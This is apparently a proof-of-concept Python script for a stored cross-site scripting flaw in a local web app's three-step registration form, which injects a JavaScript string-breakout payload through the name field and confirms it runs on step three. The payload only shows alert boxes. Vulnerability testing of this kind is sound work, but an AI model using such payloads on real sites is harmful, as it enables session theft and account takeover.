#!/usr/bin/env python3
"""
Stored XSS Vulnerability POC
Target: http://localhost:8081/accounts/register/step1, step2, step3
Vulnerability: Stored XSS via Registration Form Name Parameter
CVE: N/A (Custom Application)
CWE: CWE-79 (Improper Neutralization of Input During Web Page Generation)
CVSS: 7.1 (High) - Stored XSS

Description:
The registration form accepts user input in the 'name' field without proper
sanitization. This name is directly injected into a JavaScript alert statement
in Step 3 of the registration, leading to arbitrary JavaScript execution.

Vulnerable Code:
- views.py: register_step3() loads register_step3.html template and replaces
  ACCOUNTNAME with request.session['name'] using template.replace()
- Template contains: <script>alert("Hello ACCOUNTNAME. Just Now up to 50% OFF ")</script>

Exploitation:
1. Navigate to /accounts/register/step1/
2. Enter malicious payload in name field, e.g.: test");alert("XSS");alert("
3. Complete registration steps 2 and 3
4. JavaScript payload executes in the browser during Step 3
"""

import requests
import re
import sys

def exploit():
    """Execute the XSS vulnerability POC"""
    
    print("[*] Stored XSS Vulnerability POC")
    print("[*] Target: http://localhost:8081/accounts/register/")
    
    session = requests.Session()
    
    # XSS Payload - breaks out of JavaScript string and executes arbitrary JS
    xss_payload = 'test");alert("XSS Successfully Injected");alert("'
    
    # Step 1: Registration form - name entry
    print(f"\n[*] Step 1: Submitting XSS payload in registration form")
    r = session.get('http://localhost:8081/accounts/register/step1/')
    csrf = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', r.text).group(1)
    
    r = session.post('http://localhost:8081/accounts/register/step1/', data={
        'name': xss_payload,
        'password': 'TestPass12345',
        'csrfmiddlewaretoken': csrf
    }, allow_redirects=False)
    
    if r.status_code != 302:
        print(f"[!] Step 1 failed: Expected 302, got {r.status_code}")
        return False
    
    print("[+] Step 1 passed - Payload accepted")
    
    # Step 2: Email entry
    print(f"\n[*] Step 2: Submitting email")
    r = session.get('http://localhost:8081/accounts/register/step2/')
    csrf = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', r.text).group(1)
    
    r = session.post('http://localhost:8081/accounts/register/step2/', data={
        'email': 'xss_poc@test.com',
        'csrfmiddlewaretoken': csrf
    }, allow_redirects=False)
    
    if r.status_code != 302:
        print(f"[!] Step 2 failed: Expected 302, got {r.status_code}")
        return False
    
    print("[+] Step 2 passed")
    
    # Step 3: Vulnerable page with injected payload
    print(f"\n[*] Step 3: Retrieving registration completion page (vulnerable)")
    r = session.get('http://localhost:8081/accounts/register/step3/')
    
    if r.status_code != 200:
        print(f"[!] Step 3 failed: Expected 200, got {r.status_code}")
        return False
    
    # Verify XSS payload is in the response
    if xss_payload not in r.text:
        print(f"[!] XSS payload not found in response")
        return False
    
    print("[+] Step 3 completed - XSS payload found in response!")
    
    # Find and display the vulnerable JavaScript
    print(f"\n[+] VULNERABILITY CONFIRMED - Stored XSS via Registration Name Field")
    print(f"\n[*] Vulnerable JavaScript Code:")
    for line in r.text.split('\n'):
        if 'alert' in line.lower():
            print(f"    {line.strip()}")
    
    return True

if __name__ == '__main__':
    success = exploit()
    sys.exit(0 if success else 1)

